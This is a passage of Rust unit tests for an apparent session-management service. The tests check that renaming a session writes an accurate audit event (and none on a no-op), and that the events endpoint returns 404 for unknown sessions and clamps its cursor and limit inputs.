        assert_eq!(rt.target(), "supermux-legacy");
        let _ = std::fs::remove_dir_all(dir);
    }

    fn relabel(display_name: &str) -> ConfigInput {
        ConfigInput {
            rename: None,
            display_name: Some(display_name.into()),
            desc: None,
            dir: None,
            branch: None,
            mcp: None,
            tags: None,
            toggle_pin: None,
            mark_pin: None,
            notif: None,
            toggle_auto_continue: None,
        }
    }

    /// The rename line is an attribution claim, so the ledger row behind it has
    /// to be exact: the label it replaced, the label it set, and NO row at all
    /// when nothing moved (a "renamed from X to X" line in a transcript is a
    /// lie about an event that never happened).
    #[tokio::test]
    async fn a_label_change_audits_its_real_from_and_to_and_a_no_op_audits_nothing() {
        let (state, dir) = test_state().await;
        create(&state, input("web-ui")).await.expect("create");
        let feed = |state: AppState| async move {
            db::audit::events_for_session(&state.pool, "web-ui", 0, 50).await.unwrap()
        };

        // Clearing an already-empty label resets it to the slug — the value the
        // UI was already showing. Nothing changed, so nothing is claimed.
        config_patch(&state, "web-ui", relabel("   ")).await.expect("no-op relabel");
        assert!(feed(state.clone()).await.is_empty(), "a no-op clear must not audit a rename");

        config_patch(&state, "web-ui", relabel("Web UI")).await.expect("relabel");
        let events = feed(state.clone()).await;
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].action, "session.rename");
        assert_eq!(events[0].actor, "user");
        assert_eq!(events[0].target, "web-ui");
        let detail: serde_json::Value = serde_json::from_str(&events[0].detail).unwrap();
        // An empty stored label reads as the slug everywhere else in the UI, so
        // that — not "" — is what it was renamed FROM.
        assert_eq!(detail["from"], "web-ui");
        assert_eq!(detail["to"], "Web UI");

        // Setting the same label again is not a second rename.
        config_patch(&state, "web-ui", relabel("Web UI")).await.expect("idempotent relabel");
        assert_eq!(feed(state.clone()).await.len(), 1);
        let _ = std::fs::remove_dir_all(dir);
    }

    /// The feed is a per-session read: an unknown name is a 404, not an empty
    /// page that reads as "this session had no harness events".
    #[tokio::test]
    async fn the_events_feed_404s_on_an_unknown_session_and_clamps_its_limit() {
        let (state, dir) = test_state().await;
        create(&state, input("web-ui")).await.expect("create");

        let err = events_handler(
            State(state.clone()),
            Path("nope".into()),
            Query(EventsQuery { since_id: 0, limit: EVENTS_LIMIT_DEFAULT }),
        )
        .await
        .err()
        .expect("an unknown session must not return a page");
        assert!(matches!(err, AppError::NotFound(_)), "{err:?}");

        // A negative cursor and an absurd limit are clamped, never passed to SQL.
        let out = events_handler(
            State(state.clone()),
            Path("web-ui".into()),
            Query(EventsQuery { since_id: -5, limit: 100_000 }),
        )
        .await
        .expect("known session");
        assert!(out.0.data.events.is_empty());
        let _ = std::fs::remove_dir_all(dir);
    }
}
